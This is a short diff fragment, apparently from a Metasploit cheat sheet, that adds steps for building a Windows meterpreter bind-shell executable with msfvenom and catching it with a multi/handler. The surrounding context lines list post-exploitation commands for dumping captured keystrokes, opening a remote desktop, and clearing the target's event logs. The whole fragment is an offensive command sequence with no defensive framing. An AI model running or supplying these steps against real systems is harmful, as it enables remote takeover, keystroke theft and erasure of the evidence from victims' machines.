@@ -40,3 +40,11 @@ meterpreter > keyscan_dump
 meterpreter > run getgui -h
 meterpreter > clearev
 meterpreter > quit
+
+msfvenom -p windows/meterpreter/bind_tcp -f exe > {Path}
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp
+set rhost {IP}
+set lport {port}
+exploit
